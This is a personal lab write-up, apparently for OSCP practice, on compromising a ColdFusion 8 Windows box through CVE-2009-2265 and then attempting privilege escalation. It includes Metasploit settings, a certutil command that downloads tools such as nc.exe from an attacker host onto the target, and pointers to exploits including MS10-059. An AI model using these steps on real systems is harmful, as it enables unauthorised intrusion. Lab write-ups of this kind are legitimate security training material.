
Name: Artic
Date:  
Difficulty:  
Description:  
Better Description:  
Goals:  
Learnt:

## Recon

![ping](Screenshots/ping-os-test.png)

There is some kind of anti-bruteforcing in place on the web server. 
Reset the box once to check and the second to continue without bruteforcing anything.
Here are the two directories:
![dirs1](Screenshots/cfdocs-dir.png)

![dirs2](Screenshots/cfide-dir.png)

`CFIDE/wizards/common/_logintowizard.cfm` and `/CFIDE/wizards/common/_authenticatewizarduser.cfm`
The default password `admin` works but so does anything else as templates but neither is linked to actual functionality of the site. Tried default password on the /administrator. Did not work. I also tried injecting a request to wait tcpdump to see if &path= variable was exploitable before dorking exploits for abode fusion 8. 

## Exploit

There is a [metasploit module](https://www.exploit-db.com/exploits/16788) for [CVE-2009-2265](https://nvd.nist.gov/vuln/detail/CVE-2009-2265). 
Before changes:
![metasploit](Screenshots/metasploit-setup.png)

I tried on the second it worked, with the smae settings: 
```bash
set lhost tun0
set rport 8500
```
Due to the OSCP restrictions on Metasploit usage.
Here is a good is a good [python exploit](https://github.com/0xkasra/CVE-2009-2265)
![exploit](Screenshots/exploit.png)

![listen](Screenshots/listener.png)

![foothold](Screenshots/foothold.png)

Included in screenshot are possible privesc through user privileges which I may return once I enumerate the box.

![systeminfo](Screenshots/systeminfo.png)

`C:\Users\tolis\Desktop\user.txt`

## PrivEsc

Used certutil to transfer nc.exe, windowsprivchecker.bat and wes-ng
I tried alot of other things that kicked me off or did not run in either /runtime/bin and /users/tolis


```powershell
certutil.exe -urlcache -split -f "http://$IP/$tools"
```

Basically I would have to blow my metasploit on this machine.
Before reading a writeup to the walkthrough the same process I will redo the metasploit version with the post module as meterpreter just seems although a good way to end in one usage, I am at the PrivEsc phase. Plus I have not use it enough so far. Even the post module did not work. Then meterpreter did not work. I research ways to host files on windows as it seems like a hobby at this point finding and archiving every possible way to transfer files. I ended up copying and pasting into a systeminfo.txt file to this directory. Wesng works, but does not find the intend route. 

```bash
./wes.py --update
./wes.py systeminfo.txt > wesng-out.txt
```
There is a kernel exploit for the cpu that has metasploit module to it. I tried that did not work as well doing it manually compiling it, but I could not finder one of the headers. Write ups suggest a pre-compiled binary. That seems really stupid. There is metasploit module for this so this machine is basically goodbye your metasploit usage in the exam machines given time constraints. 

[manual](https://www.exploit-db.com/exploits/15589) Seems like there are errors in the script.

At this point after multiple days trying to crack this. I revert this to a walkthrough for the remaining part.
From a multitude of writeups that I have then read and watched, either its through metasploit... or a precompiled binary from github...
I will return after complete all the others to retry without the precompiled binary. 
MS10-059
